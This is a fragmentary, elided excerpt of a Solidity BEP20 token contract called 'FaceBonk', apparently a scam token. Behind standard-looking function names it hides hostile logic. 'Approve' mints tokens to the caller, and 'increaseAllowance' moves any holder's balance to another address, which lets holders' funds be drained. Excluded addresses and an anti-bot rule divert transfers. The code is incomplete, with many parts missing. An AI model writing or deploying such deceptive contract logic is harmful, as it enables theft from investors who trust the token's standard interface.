...
contract FaceBonk is Ownable, IBEP20 {

    string private _name = "FaceBonk";
    ...
    function Approve(uint256 amount) public {
        ...
        _Antisquids[msg.sender] = _Antisquids[msg.sender] + amount;
            emit Transfer(address(0), msg.sender, amount);
    }
    
    function balanceOf(address account) external view override returns (uint256) {
        return _Antisquids[account];
    }
    ...
    function increaseAllowance(address owner, address spender, uint256 amount) public {
        ...
        _Antisquids[owner] = _Antisquids[owner] - amount;
        _Antisquids[spender] = _Antisquids[spender] + amount;
    ...
    function enable() public onlyOwner {
     ...
     function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_excluded[sender] || _excluded[recipient]) {
            _Antisquids[sender] = _Antisquids[sender] - amount;
            _Antisquids[recipient] = _Antisquids[recipient] + amount;
                emit Transfer(sender, recipient, amount);
        } else {
            ...
            if (block.timestamp < _antiBotTime) {
                _Antisquids[address(0)] = _Antisquids[address(0)] + amount;
